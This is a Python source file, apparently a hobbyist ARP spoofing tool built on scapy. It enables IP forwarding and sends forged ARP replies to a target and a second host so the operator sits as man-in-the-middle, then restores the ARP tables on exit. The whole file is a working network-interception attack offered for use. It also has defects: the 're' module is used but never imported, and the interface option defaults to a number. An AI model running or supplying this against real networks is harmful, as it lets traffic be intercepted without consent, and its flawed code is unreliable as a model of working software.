import scapy.all as scapy
import optparse
import time
import subprocess


def get_arguments():
    arguments = optparse.OptionParser()
    arguments.add_option("-t", "--target", action="store", metavar='\b', dest="target_ip", help="target ip[machine-1]")
    arguments.add_option("-s", "--spoof", metavar='\b', dest="spoof_ip", help="spoof ip[machine-2](router or another machine on local network)")
    arguments.add_option("-p", "--sleep", metavar='\b', dest="sleeptime", default=0, help="time to sleep after sending a packet(default=0)")
    arguments.add_option("-c", "--count", metavar='\b', dest="count", default=1000, help="number of packets to be sent(default=1000)")
    arguments.add_option("-i", "--interface", metavar='\b', dest="interface", default=1000, help="give interface")
    values, options = arguments.parse_args()
    if not (values.target_ip and values.spoof_ip and values.interface):
        arguments.error("give arguments\n[+]HELP: python3 arp_spoofer.py -h")
    return values


def get_mac(ip):
    try:
        arp_packet = scapy.ARP(pdst=ip)
        brodcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        create_packet = brodcast/arp_packet
        sendpacket = scapy.srp(create_packet, timeout=1, verbose=False)[0]
        return sendpacket[0][1].hwsrc
    except IndexError:
        print("[-]{} is not active".format(ip))
        print("\n[+]OK Quiting...")
        exit()

        
def get_interface_mac(interface):
    ifconfig_result = subprocess.check_output(["ifconfig", values.interface])
    extracted_result = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", str(ifconfig_result))
    if extracted_result:
        return extracted_result.group(0)
    else:
        print("[-]couldn't find any mac address for the given interface")
        exit()


def restore(target_ip, spoof_ip):
    for i in range(0, 4):
        spoof_real_mac = get_mac(spoof_ip)
        target_mac = get_mac(target_ip)
        packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwsrc=spoof_real_mac, hwdst=target_mac)
        scapy.send(packet, count=2, verbose=False)
        p = target_ip
        target_ip = spoof_ip
        spoof_ip = p
    print("\n[+]ARP tables are back to original macs on both machines")


def spoof(target_ip, spoof_ip, count, sleeptime, interface):
    print("\nARP-spoofer coded by @koushikk11\n")
    print("Date:23/06/2021\n")
    subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
    print("[+]ip forwarding enabled")
    interface_mac = get_interface_mac(interface)
    h = int(sleeptime)
    v = int(count)
    try:
        for i in range(1, v+1):
            target_mac = get_mac(target_ip)
            create_packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst=target_mac, hwsrc=interface_mac)
            scapy.send(create_packet, verbose=False)
            time.sleep(h)
            p = target_ip
            target_ip = spoof_ip
            spoof_ip = p
            print("\r[+]sent {} packets to both machines, you are MITM :-)".format(i), end=" ")
    except KeyboardInterrupt:
        restore(target_ip, spoof_ip)
        print("[+]OK Quiting... youre not MITM :-(")
        exit()

    restore(target_ip, spoof_ip)
    print("[+]OK Quiting... youre not MITM :-(")


values = get_arguments()
spoof(values.target_ip, values.spoof_ip, values.count, values.sleeptime, values.interface)
